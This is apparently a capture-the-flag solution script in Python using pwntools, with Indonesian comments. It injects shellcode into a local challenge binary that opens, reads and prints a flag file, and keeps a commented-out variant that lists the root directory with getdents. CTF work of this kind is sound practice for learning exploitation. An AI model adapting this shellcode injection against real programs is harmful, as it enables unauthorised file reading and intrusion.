from pwn import *

elf = context.binary = ELF('chall')
p = elf.process()

'''
gajadi pake getdents cuy

ini getdents kyk ls /
'''
#shellcode = shellcraft.open("/")
#shellcode += shellcraft.getdents('rax', 'rsp', 0x500)
#shellcode += shellcraft.write(1, 'rsp', 0x500)

'''
ini read kyk cat /flagdottieksti.txt
'''
shellcode = shellcraft.open('/flagdottieksti.txt')
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)

p.send(asm(shellcode))

p.interactive()
